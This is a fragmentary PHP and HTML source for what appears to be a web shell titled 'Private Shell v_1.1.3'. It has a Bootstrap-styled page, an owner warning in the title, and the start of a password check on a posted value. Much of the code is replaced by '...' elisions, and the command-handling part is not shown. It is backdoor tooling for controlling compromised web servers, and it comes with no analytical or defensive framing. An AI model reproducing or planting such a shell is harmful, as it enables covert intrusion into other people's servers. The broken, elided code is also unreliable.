...
<html>
	<head>
		...
		<title><?=$_SERVER['HTTP_HOST'];?>Private Shell‎ ‎ v_1.1.3‎ - --->if you are not owner, stay away<--- -</title>
...
<div class="container-fluid">
	<div class="py-3" id="main">
		<div class="box shadow bg-dark p-4 rounded-3">
			<form method="post">
				<i class="bi bi-display"></i>&nbsp;Private Shell‎ ‎ v_1.1.3‎ - --->if you are not owner, stay away<--- -</u>
<?php
if($nana['pwd']) {
	if($nana['pwd'] == $pwd) {
...
?>
		...
		<div class="text-secondary">&copy; <?=date("Y");?> Private Shell</div>
		</div>
	</div>
</div>
</body>
